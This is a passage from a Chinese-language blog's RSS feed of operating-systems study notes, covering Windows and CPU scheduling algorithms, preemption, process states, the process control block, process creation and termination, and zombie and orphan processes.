&lt;h3 id=&#34;windows调度系统详解&#34;&gt;Windows调度系统详解
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Windows调度基础
&lt;ul&gt;
&lt;li&gt;Windows使用基于优先级的抢占式调度&lt;/li&gt;
&lt;li&gt;最高优先级的线程下一个运行&lt;/li&gt;
&lt;li&gt;调度器就是分发器(Dispatcher)&lt;/li&gt;
&lt;li&gt;线程运行直到 (1)阻塞，(2)用完时间片，(3)被更高优先级线程抢占&lt;/li&gt;
&lt;li&gt;实时线程可以抢占非实时线程&lt;/li&gt;
&lt;li&gt;32级优先级方案：可变类是1-15，实时类是16-31&lt;/li&gt;
&lt;li&gt;优先级0是内存管理线程&lt;/li&gt;
&lt;li&gt;每个优先级一个队列&lt;/li&gt;
&lt;li&gt;如果没有可运行线程，运行空闲线程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Windows优先级类
&lt;ul&gt;
&lt;li&gt;不同的优先级类&lt;/li&gt;
&lt;li&gt;一个类内的相对优先级&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>调度</title>
        <link>https://example.com/p/%E8%B0%83%E5%BA%A6/</link>
        <pubDate>Fri, 01 Aug 2025 21:50:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E8%B0%83%E5%BA%A6/</guid>
        <description>&lt;h1 id=&#34;调度&#34;&gt;调度
&lt;/h1&gt;&lt;h2 id=&#34;调度术语&#34;&gt;调度术语
&lt;/h2&gt;&lt;h3 id=&#34;术语辨析&#34;&gt;术语辨析
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;被操作系统调度的是内核线程————而不是进程&lt;/li&gt;
&lt;li&gt;然而，“线程调度”和“进程调度”这两个属于经常互换使用&lt;/li&gt;
&lt;li&gt;当讨论一般概念时我们使用“进程调度”，当设计线程特定概念时使用“线程调度”&lt;/li&gt;
&lt;li&gt;同时“在CPU上运行”实际是指在“CPU核心上运行”&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注cpu与cpu核心&#34;&gt;注：CPU与CPU核心
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CPU可以包含多个核心。何以把CPU比作一座办公大楼，CPU核心是一个办公室，正在执行的线程就是一个正在工作的员工&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程调度&#34;&gt;进程调度
&lt;/h2&gt;&lt;h3 id=&#34;基本概念&#34;&gt;基本概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;进程执行由CPU执行和I/O等待的循环组成&lt;/li&gt;
&lt;li&gt;CPU突发和I/O突发交替进行&lt;/li&gt;
&lt;li&gt;CPU突发分布在进程间和计算机间差异很大，但遵循相似的曲线&lt;/li&gt;
&lt;li&gt;通过多道程序设计获得最大的CPU利用率&lt;/li&gt;
&lt;li&gt;当前进程处于I/O突发时，CPU调度器选择另一个进程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cpu调度器&#34;&gt;CPU调度器
&lt;/h3&gt;&lt;h4 id=&#34;调度决策选择&#34;&gt;调度决策选择
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;CPU调度器从就绪队列中的进程中进行选择，并将CPU分配给其中一个进程&lt;/li&gt;
&lt;li&gt;CPU调度决策可能在一下情况发生
&lt;ul&gt;
&lt;li&gt;进程从运行状态切换到等待状态&lt;/li&gt;
&lt;li&gt;进程从运行状态切换到就绪状态&lt;/li&gt;
&lt;li&gt;进程从等待状态切换到就绪状态&lt;/li&gt;
&lt;li&gt;进程终止&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;仅在条件1和4下的调度是非抢占式的
&lt;ul&gt;
&lt;li&gt;一旦CPU被分配给进程，该进程会保持CPU直到终止或等待I/O&lt;/li&gt;
&lt;li&gt;也被称为协作式调度&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;抢占式调度还会在条件2和3下调度进程
&lt;ul&gt;
&lt;li&gt;抢占式调度需要硬件支持，如定时器&lt;/li&gt;
&lt;li&gt;需要同步原语&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;注协作式调度与抢占式调度&#34;&gt;注：协作式调度与抢占式调度
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;协作式调度：自觉排队
&lt;ul&gt;
&lt;li&gt;基本思想：没有管理员的机房，每个人用完电脑后主动让给下一个人，程序自己决定什么时候停下来并主动分享资源&lt;/li&gt;
&lt;li&gt;什么时候让出CPU
&lt;ul&gt;
&lt;li&gt;程序需要读写文件时（I/O）&lt;/li&gt;
&lt;li&gt;程序主动调用sleep休眠&lt;/li&gt;
&lt;li&gt;程序运行完毕退出&lt;/li&gt;
&lt;li&gt;程序主动调用yield让出&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;抢占式调度：由管理员的排队
&lt;ul&gt;
&lt;li&gt;核心思想：有管理员的机房，管理员用定时器控制每个人的使用时间，到了时间就必须让出&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;什么时候强制切换
&lt;ul&gt;
&lt;li&gt;时间片用完&lt;/li&gt;
&lt;li&gt;有更高优先级的程序要运行&lt;/li&gt;
&lt;li&gt;程序进行I/O操作时&lt;/li&gt;
&lt;li&gt;程序运行完毕&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;抢占&#34;&gt;抢占
&lt;/h3&gt;&lt;h4 id=&#34;内核抢占&#34;&gt;内核抢占
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;抢占也会影响系统内核的设计&lt;/li&gt;
&lt;li&gt;如果在更新共享数据时被抢占，内核状态将会不一致&lt;/li&gt;
&lt;li&gt;即当中断发生时内核正在服务系统调用&lt;/li&gt;
&lt;li&gt;两种解决方案
&lt;ul&gt;
&lt;li&gt;等待系统调用完成或I/O阻塞&lt;/li&gt;
&lt;li&gt;内核时非抢占式的，但对进程仍然是抢占式的&lt;/li&gt;
&lt;li&gt;在更新共享数据时禁用内核抢占&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最新的Linux内核采用这种方法
&lt;ul&gt;
&lt;li&gt;Linux支持SMP&lt;/li&gt;
&lt;li&gt;共享数据受内核同步保护&lt;/li&gt;
&lt;li&gt;在内核同步时禁用内核抢占&lt;/li&gt;
&lt;li&gt;将非抢占式SMP内核转变为抢占式内核&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户抢占和内核抢占的具体时机&#34;&gt;用户抢占和内核抢占的具体时机
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;用户抢占
&lt;ul&gt;
&lt;li&gt;从系统调用返回用户空间时&lt;/li&gt;
&lt;li&gt;从中断处理程序返回用户空间时&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内核抢占
&lt;ul&gt;
&lt;li&gt;当中断处理程序退出，返回内核空间之前&lt;/li&gt;
&lt;li&gt;当内核代码重新变为可抢占时&lt;/li&gt;
&lt;li&gt;如果内核中的任务显示调用schedule()&lt;/li&gt;
&lt;li&gt;如果内核中的任务阻塞（这会导致调用schedule）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;分派器dispatcher&#34;&gt;分派器(Dispatcher)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;分派器模块将CPU的控制权交给由段齐调度器选中的进程&lt;/li&gt;
&lt;li&gt;切换上下文&lt;/li&gt;
&lt;li&gt;切换到用户模式&lt;/li&gt;
&lt;li&gt;跳转到用户程序中的正确位置以重启该程序&lt;/li&gt;
&lt;li&gt;分派延迟：分派其停止一个进程并启动另一个进程所需的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;调度标准&#34;&gt;调度标准
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CPU利用率：CPU忙碌的百分比&lt;/li&gt;
&lt;li&gt;吞吐量：每个事件单位内完成执行的进程数量&lt;/li&gt;
&lt;li&gt;周转时间：执行特定进程的事件
&lt;ul&gt;
&lt;li&gt;从提交时间到完成时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;等待时间：在就绪队列中等待的总时间&lt;/li&gt;
&lt;li&gt;相应时间：从请求提交到产生第一个相应所需的时间
&lt;ul&gt;
&lt;li&gt;开始相应所需的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;调度算法优化标准&#34;&gt;调度算法优化标准
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一般来说，最大化CPU利用率和吞吐率，最小化周转时间、等待时间和响应时间&lt;/li&gt;
&lt;li&gt;不同系统优化不同的值&lt;/li&gt;
&lt;li&gt;在多数情况下优化平均值&lt;/li&gt;
&lt;li&gt;在某些情况下，优化最小值或最大值
&lt;ul&gt;
&lt;li&gt;例如：实时系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对于交互式系统，最小化响应时间的方差&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;调度算法&#34;&gt;调度算法
&lt;/h3&gt;&lt;h4 id=&#34;先来先服务调度fcfs&#34;&gt;先来先服务调度(FCFS)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;总结：排队买票&lt;/li&gt;
&lt;li&gt;核心思想：谁先来谁先服务，就像银行排队一样&lt;/li&gt;
&lt;li&gt;工作原理
&lt;ul&gt;
&lt;li&gt;按照进程到达的先后顺序执行&lt;/li&gt;
&lt;li&gt;第一个到达当地的进程先执行完，在执行第二个，以此类推&lt;/li&gt;
&lt;li&gt;一旦开始执行就不会被打断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点：公平、简单、不会饥饿&lt;/li&gt;
&lt;li&gt;缺点：短任务可能等很久（护航效应）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;最短作业优先调整sjf&#34;&gt;最短作业优先调整(SJF)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;总结：快餐优先&lt;/li&gt;
&lt;li&gt;核心思想：总是先做最快能完成的任务&lt;/li&gt;
&lt;li&gt;工作原理：
&lt;ul&gt;
&lt;li&gt;在所有等待的进程中，选择执行时间最短的执行&lt;/li&gt;
&lt;li&gt;可以大幅减少平均等待时间&lt;/li&gt;
&lt;li&gt;需要事先知道每个进程要执行多长时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点：平均等待时间最短（理论最优）&lt;/li&gt;
&lt;li&gt;缺点：长任务可能永远轮不到（饥饿问题）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;优先级调度priority&#34;&gt;优先级调度(Priority)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：重要的任务先做&lt;/li&gt;
&lt;li&gt;工作原理：
&lt;ul&gt;
&lt;li&gt;每个进程都有一个优先级数字&lt;/li&gt;
&lt;li&gt;总是选择优先级最高的进程执行&lt;/li&gt;
&lt;li&gt;可以根据重要性动态调整优先级&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;老化机制：为了防止普通顾客永远等不到，可以让等待时间长的客户逐渐升级&lt;/li&gt;
&lt;li&gt;优点：体现重要性，灵活可控&lt;/li&gt;
&lt;li&gt;缺点：低优先级可能饥饿，需要防饥饿机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;时间片轮转调度round-robin&#34;&gt;时间片轮转调度(Round Robin)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：轮流服务&lt;/li&gt;
&lt;li&gt;工作原理：
&lt;ul&gt;
&lt;li&gt;给每个进程分配相同的时间片&lt;/li&gt;
&lt;li&gt;时间到了就强制切换到下一个进程&lt;/li&gt;
&lt;li&gt;没完成的进程重新排队等下一轮&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点：响应时间好，公平，适合交互式系统&lt;/li&gt;
&lt;li&gt;缺点：频繁切换有开销，时间片大小难选择&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多级队列调度mlq&#34;&gt;多级队列调度(MLQ)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：分类服务&lt;/li&gt;
&lt;li&gt;工作原理
&lt;ul&gt;
&lt;li&gt;把进程分成几个固定的类别（系统进程、前台进程、后台进程等）&lt;/li&gt;
&lt;li&gt;每个类别有自己的队列和调度策略&lt;/li&gt;
&lt;li&gt;高优先级队列优先服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点：不同类型用最适合的策略，系统进程优先&lt;/li&gt;
&lt;li&gt;缺点：底层队列可能饥饿，分类可能不准确&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多级反馈队列调度mlfq&#34;&gt;多级反馈队列调度(MLFQ)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：根据客户的行为表现动态调整服务等级&lt;/li&gt;
&lt;li&gt;工作原理：
&lt;ul&gt;
&lt;li&gt;新进程从最高优先级队列开始&lt;/li&gt;
&lt;li&gt;如果用完时间片还没完成，就降级到下一级队列&lt;/li&gt;
&lt;li&gt;如果主动让出CPU（比如等待I/O），可能提升等级&lt;/li&gt;
&lt;li&gt;等待太久的进程会自动升级（防止饥饿）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点：最只能，自适应，段任务响应快，长任务不饥饿&lt;/li&gt;
&lt;li&gt;缺点：最复杂，参数调整困难，实现开销大&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;mlq详解&#34;&gt;MLQ详解
&lt;/h4&gt;&lt;h5 id=&#34;多级队列调度&#34;&gt;多级队列调度
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;多级队列调度
&lt;ul&gt;
&lt;li&gt;就绪队列被分割为多个独立的队列&lt;/li&gt;
&lt;li&gt;例如：前台（交互式）进程和后台（批处理）进程&lt;/li&gt;
&lt;li&gt;进程被永久分配到指定的队列&lt;/li&gt;
&lt;li&gt;每个队列都有自己的调度算法&lt;/li&gt;
&lt;li&gt;例如：交互式进程使用RR，批处理进程使用FCFS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;队列间调度
&lt;ul&gt;
&lt;li&gt;必须子啊队列之间进行调度&lt;/li&gt;
&lt;li&gt;固定优先级调度&lt;/li&gt;
&lt;li&gt;存在饥饿的可能性&lt;/li&gt;
&lt;li&gt;时间片分配：每个队列获得一定数量的CPU时间，用于在其进程之间进行调度&lt;/li&gt;
&lt;li&gt;例如：前台进程80%时间用RR，后台进程20%时间用FCFS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;多级反馈队列
&lt;ul&gt;
&lt;li&gt;多级反馈队列调度使用多级队列&lt;/li&gt;
&lt;li&gt;进程可以在不同队列之间移动&lt;/li&gt;
&lt;li&gt;它试图推断进程的类型&lt;/li&gt;
&lt;li&gt;老化机制可以通过这种方式实现&lt;/li&gt;
&lt;li&gt;目标时给交互式和I/O密集型进程高优先级&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MLFQ定义参数
&lt;ul&gt;
&lt;li&gt;MLFQ调度器由以下参数定义&lt;/li&gt;
&lt;li&gt;队列数量&lt;/li&gt;
&lt;li&gt;每个队列的调度算法&lt;/li&gt;
&lt;li&gt;确定何时给进程分配更高优先级的方法&lt;/li&gt;
&lt;li&gt;确定何时降级进程的方法&lt;/li&gt;
&lt;li&gt;确定进程需要服务时进入那个队列的方法&lt;/li&gt;
&lt;li&gt;MLFQ是最通用的CPU调度算法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线程调度&#34;&gt;线程调度
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;操作系统内核调度内核线程&lt;/li&gt;
&lt;li&gt;系统竞争范围 (SCS)：系统中所有线程之间的竞争&lt;/li&gt;
&lt;li&gt;内核不知道用户线程的存在&lt;/li&gt;
&lt;li&gt;线程库将用户线程调度到LWP上&lt;/li&gt;
&lt;li&gt;用于多对一和多对多线程模型&lt;/li&gt;
&lt;li&gt;进程竞争范围 (PCS)：进程内部的调度竞争&lt;/li&gt;
&lt;li&gt;PCS通常基于用户设置的优先级&lt;/li&gt;
&lt;li&gt;被调度到LWP的用户线程不一定在CPU上运行&lt;/li&gt;
&lt;li&gt;操作系统内核需要将LWP的内核线程调度到CPU上&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>进程</title>
        <link>https://example.com/p/%E8%BF%9B%E7%A8%8B/</link>
        <pubDate>Fri, 01 Aug 2025 21:50:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E8%BF%9B%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;进程&#34;&gt;进程
&lt;/h1&gt;&lt;h2 id=&#34;进程的概念&#34;&gt;进程的概念
&lt;/h2&gt;&lt;h3 id=&#34;进程与程序&#34;&gt;进程与程序
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一个操作系统可以运行许多个程序，一个运行中的程序被称为&lt;strong&gt;进程(Process)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;进程与程序的关系：
&lt;ul&gt;
&lt;li&gt;程序是被动和静态的，进程是主动和动态的&lt;/li&gt;
&lt;li&gt;一个程序对应的可能有多个进程&lt;/li&gt;
&lt;li&gt;程序可以通过GUI或命令行启动&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程的组成&#34;&gt;进程的组成
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;程序代码
&lt;ul&gt;
&lt;li&gt;内容：可执行的程序指令&lt;/li&gt;
&lt;li&gt;特点：只读，多个相同进程可以共享同一份代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;运行时CPU状态
&lt;ul&gt;
&lt;li&gt;程序技术去(PC): 指向下一条要执行的指令地址&lt;/li&gt;
&lt;li&gt;寄存器组：
&lt;ul&gt;
&lt;li&gt;通用寄存器：存储计算数据&lt;/li&gt;
&lt;li&gt;状态寄存器：保存处理器状态标志&lt;/li&gt;
&lt;li&gt;专用寄存器：如栈指针、基址寄存器等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内存区域
&lt;ul&gt;
&lt;li&gt;栈(Stack)&lt;/li&gt;
&lt;li&gt;数据段(Data Section)&lt;/li&gt;
&lt;li&gt;堆(Heap)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程的状态state&#34;&gt;进程的状态(State)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一个进程包含以下状态
&lt;ul&gt;
&lt;li&gt;new&lt;/li&gt;
&lt;li&gt;running&lt;/li&gt;
&lt;li&gt;wating/blocking&lt;/li&gt;
&lt;li&gt;ready&lt;/li&gt;
&lt;li&gt;terminated&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;状态转换示意图&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://example.com/images/process1.png&#34; alt=&#34;State&#34; width=&#34;80%&#34;&gt;
&lt;/p&gt;
&lt;h3 id=&#34;进程控制块process-control-block-pcb&#34;&gt;进程控制块(Process Control Block, PCB)
&lt;/h3&gt;&lt;h4 id=&#34;基本概念&#34;&gt;基本概念
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;PCB是操作系统管理进程的核心数据结构，每个进程都有唯一的PCB&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;pcb的四大类信息&#34;&gt;PCB的四大类信息、
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;进程标识信息
&lt;ul&gt;
&lt;li&gt;PID：进程唯一标识符&lt;/li&gt;
&lt;li&gt;PPID：父进程ID&lt;/li&gt;
&lt;li&gt;UID/GID：用户和组标识符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;处理机状态信息
&lt;ul&gt;
&lt;li&gt;程序计数器(PC)：下一条指令地址&lt;/li&gt;
&lt;li&gt;寄存器组：CPU寄存器的值&lt;/li&gt;
&lt;li&gt;栈指针：当前栈位置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;进程调度信息：
&lt;ul&gt;
&lt;li&gt;优先级：调度优先级&lt;/li&gt;
&lt;li&gt;进程状态：运行/就绪/阻塞等&lt;/li&gt;
&lt;li&gt;CPU时间：已使用和分配的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;进程控制信息
&lt;ul&gt;
&lt;li&gt;内存管理：页表、内存映射&lt;/li&gt;
&lt;li&gt;文件管理：打开的文件列表&lt;/li&gt;
&lt;li&gt;信号处理：信号处理机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;pcb的关键作用&#34;&gt;PCB的关键作用
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;上下文切换
&lt;ul&gt;
&lt;li&gt;保存当前进程状态到PCB，然后从PCB恢复目标进程状态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;进程管理
&lt;ul&gt;
&lt;li&gt;创建：分配新PCB&lt;/li&gt;
&lt;li&gt;调度：基于PCB信息选择进程&lt;/li&gt;
&lt;li&gt;终止：释放PCB和相关资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;资源跟踪
&lt;ul&gt;
&lt;li&gt;内存分配情况&lt;/li&gt;
&lt;li&gt;打开的文件&lt;/li&gt;
&lt;li&gt;拥有的设备&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;pcb在linux中的实现-task_struct&#34;&gt;PCB在linux中的实现: task_struct
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Linux使用task_struct结构体实现PCB，包含：
&lt;ul&gt;
&lt;li&gt;进程状态和标识&lt;/li&gt;
&lt;li&gt;内存管理信息(mm_struct)&lt;/li&gt;
&lt;li&gt;文件系统信息(files_struct)&lt;/li&gt;
&lt;li&gt;父子进程关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PCB在系统中的组织
&lt;ul&gt;
&lt;li&gt;进程链表：所有进程形成链表&lt;/li&gt;
&lt;li&gt;哈希表：通过PID快速查找&lt;/li&gt;
&lt;li&gt;运行队列：就绪进程的调度队列&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线程thread&#34;&gt;线程(Thread)
&lt;/h3&gt;&lt;h2 id=&#34;进程调度&#34;&gt;进程调度
&lt;/h2&gt;&lt;h3 id=&#34;调度&#34;&gt;调度
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CPU调度器会选择接下来要运行的进程并分配内存。这个操作一般是非常快的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;调度队列&#34;&gt;调度队列
&lt;/h3&gt;&lt;h4 id=&#34;定义&#34;&gt;定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;操作系统内核用来组织和管理不同状态进程的数据结构，是实现搞笑进程调度的基础。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;三种主要调度队列&#34;&gt;三种主要调度队列
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;作业队列(Job Queue)
&lt;ul&gt;
&lt;li&gt;范围：系统中的所有进程&lt;/li&gt;
&lt;li&gt;用途：全局管理和统计&lt;/li&gt;
&lt;li&gt;对应命令：ps aux&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;就绪队列(Ready Queue)
&lt;ul&gt;
&lt;li&gt;范围：准备执行的进程&lt;/li&gt;
&lt;li&gt;特点：按优先级组织，支持快速选择&lt;/li&gt;
&lt;li&gt;实现：多级队列 + 位图索引&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;设备队列(Device Queue)
&lt;ul&gt;
&lt;li&gt;范围：等待I/O的进程&lt;/li&gt;
&lt;li&gt;分类：磁盘、网络、键盘等不同设备&lt;/li&gt;
&lt;li&gt;状态：TASK_INTERRUPTIBLE/UNINTERRUPTIBLE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;上下文切换context-switch&#34;&gt;上下文切换(Context Switch)
&lt;/h3&gt;&lt;h4 id=&#34;定义-1&#34;&gt;定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;内核切换到另一个进程去执行，保存就进程的状态并加载新进程的已保存状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;开销&#34;&gt;开销
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;上下文切换是开销，CPU在切换时不做任何有用的工作。操作系统和PCB越复杂，上下文切换时间越长，时间取决于硬件支持。某些硬件为每个CPU提供多组寄存器，可以同时加载多个上下文&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程创建&#34;&gt;进程创建
&lt;/h3&gt;&lt;h4 id=&#34;概念&#34;&gt;概念
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;父进程可以创建子进程，子进程可以进一步创建子进程，形成进程树。进程通过进程标识符(PID)来识别和管理&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;design-choices&#34;&gt;Design choices
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;三种可能的资源共享级别：全部、子集、无&lt;/li&gt;
&lt;li&gt;父进程和子进程的地址空间管理
&lt;ul&gt;
&lt;li&gt;子进程复制父进程地址空间(Linux)&lt;/li&gt;
&lt;li&gt;子进程加载新程序(Windows)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;父进程和子进程的执行
&lt;ul&gt;
&lt;li&gt;父进程和子进程并发执行&lt;/li&gt;
&lt;li&gt;父进程等待子进程终止&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用于进程创建的系统调用&#34;&gt;用于进程创建的系统调用
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;fork: 创建一个新的进程副本，结束时会返回&lt;/li&gt;
&lt;li&gt;exec: 使用一个新的进程的地址覆盖当前进程地址，加载了新程序，不会返回原程序&lt;/li&gt;
&lt;li&gt;wait: 阻塞直到子进程结束&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程终止&#34;&gt;进程终止
&lt;/h3&gt;&lt;h4 id=&#34;工作流程&#34;&gt;工作流程
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;正常终止：进程执行最后一条语句并请求内核删除它(exit)
&lt;ul&gt;
&lt;li&gt;操作系统将子进程的返回值传递给父进程(wait)&lt;/li&gt;
&lt;li&gt;进程的资源被操作系统释放&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;异常终止：父进程可能终止子进程的执行(abort)
&lt;ul&gt;
&lt;li&gt;子进程超出了分配到的资源&lt;/li&gt;
&lt;li&gt;分配给子进程的任务不在被需要&lt;/li&gt;
&lt;li&gt;如果父进程退出，一些操作系统不允许子进程继续
&lt;ul&gt;
&lt;li&gt;所有子进程（整个子树）将被终止-这被称为&lt;strong&gt;级联终止(cascading termination)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;注exit与_exit&#34;&gt;注：exit与_exit
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;exit为标准库函数，执行终止进程和清理&lt;/li&gt;
&lt;li&gt;_exit为系统调用，直接请求内核终止进程，不做清理&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;可能存在的错误僵尸进程与孤儿进程&#34;&gt;可能存在的错误————僵尸进程与孤儿进程
&lt;/h4&gt;&lt;h5 id=&#34;僵尸进程&#34;&gt;僵尸进程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;僵尸进程时已经执行完毕但父进程还没有回收其退出状态的子进程&lt;/li&gt;
&lt;li&gt;特征
&lt;ul&gt;
&lt;li&gt;进程已死亡：不再执行任何代码&lt;/li&gt;
&lt;li&gt;PCB仍存在：内核保留进程控制块&lt;/li&gt;
&lt;li&gt;保存退出状态：等待父进程读取&lt;/li&gt;
&lt;li&gt;不占用内存：代码段、数据段、栈都释放&lt;/li&gt;
&lt;li&gt;占用PID槽位：PID不能被其他进程使用&lt;/li&gt;
&lt;li&gt;ps显示为&amp;lt;defunct&amp;gt;：状态标记为Z&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;孤儿进程&#34;&gt;孤儿进程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;孤儿进程是父进程已经退出，但子进程仍然在运行的进程&lt;/li&gt;
&lt;li&gt;特征
&lt;ul&gt;
